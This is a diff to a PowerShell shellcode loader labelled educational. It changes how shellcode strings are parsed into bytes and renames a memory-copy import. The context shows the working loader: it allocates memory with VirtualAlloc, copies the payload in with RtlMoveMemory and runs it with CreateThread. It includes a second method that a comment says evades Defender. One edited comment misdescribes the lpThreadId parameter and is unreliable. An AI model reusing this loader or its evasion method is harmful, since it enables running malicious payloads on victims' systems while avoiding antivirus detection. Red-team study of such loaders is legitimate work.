@@ -1,7 +1,7 @@
 ﻿function Load-Shellcode {
 #.SYNOPSIS
 # Educational PowerShell-based Shellcode Loader
-# Arbitary Version Number: v1.0.1
+# Arbitary Version Number: v1.0.2
 # Author: Tyler McCann (@tylerdotrar)
 #
 #.DESCRIPTION
@@ -80,7 +80,7 @@
 
             # Convert to PowerShell ASCII array
             $Shellcode = $Shellcode.Replace(' ','')
-            $psShellcode = (($Shellcode.Replace('b"','').Replace('"','')).Split('\'))[1..$Shellcode.Length]
+            $psShellcode = ($Shellcode.Replace('b"','').Replace('"','')).Split('\')[1..$Shellcode.Length]
 
             # Convert Shellcode ASCII array to Byte Array
             $psByteArray = [byte[]]($psShellcode | % { [convert]::ToByte($_.Replace('x',''),16) })
@@ -94,7 +94,7 @@
 
             # Convert to PowerShell ASCII array
             $Shellcode = $Shellcode.Replace(' ','')
-            $psShellcode = (($Shellcode.Replace('{0x','').Replace('}','')).Split(',0x')) | % { if ($_ -ne "") { $_ } }
+            $psShellcode = ($Shellcode.Replace('{0x','').Replace('}','')) -Split ',0x'
 
             # Convert Shellcode ASCII array to Byte Array
             $psByteArray = [byte[]]($psShellcode | % { [convert]::ToByte($_,16) })
@@ -129,7 +129,7 @@ public class Win32 {
     public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
     [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory")]
-    public static extern void MoveMemory(IntPtr dest, IntPtr src, uint size);
+    public static extern void CopyMemory(IntPtr dest, IntPtr src, uint size);
 
     [DllImport("Kernel32.dll")]
     public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
@@ -144,7 +144,7 @@ public class Win32 {
         # Method 2: this goofy method doesn't get caught by defender, but is very noisy
         else {
             Add-Type -Namespace Var1 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);'
-            Add-Type -Namespace Var2 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory")] public static extern void MoveMemory(IntPtr dest, IntPtr src, uint size);'
+            Add-Type -Namespace Var2 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory")] public static extern void CopyMemory(IntPtr dest, IntPtr src, uint size);'
             Add-Type -Namespace Var3 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);'
             Add-Type -Namespace Var4 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll")] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);'
         }
@@ -211,8 +211,8 @@ public class Win32 {
         $gch    = [Runtime.InteropServices.GCHandle]::Alloc($psByteArray, 'Pinned')
         $srcPtr = $gch.AddrOfPinnedObject()
 
-        if (!$Please) { [Win32]::MoveMemory($shellAddr, $srcPtr, $shellSize)    }
-        else          { [Var2.Api]::MoveMemory($shellAddr, $srcPtr, $shellSize) }
+        if (!$Please) { [Win32]::CopyMemory($shellAddr, $srcPtr, $shellSize)    }
+        else          { [Var2.Api]::CopyMemory($shellAddr, $srcPtr, $shellSize) }
 
         $gch.free | Out-Null
 
@@ -243,7 +243,7 @@ public class Win32 {
     #  > lpStartAddress      > [IntPtr]  > pointer to the memory address to be executed              (i.e., executable shellcode memory address)
     #  > lpParameter         > [IntPtr]  > pointer to a variable to be passed to the thread          (i.e., 0 means none)
     #  > dwCreationFlags     > [Int]     > creation flags of the thread                              (i.e., 0 means the thread runs immediately after creation)
-    #  > lpThreadId          > [IntPtr]  > pointer to a variable that receives the thread identifier (i.e., null means nothing is returned)
+    #  > lpThreadId          > [IntPtr]  > pointer to a variable that receives the thread identifier (i.e., 0 points to the current process)
 
     Write-Host "[!] Executing shellcode..." -ForegroundColor Yellow
 
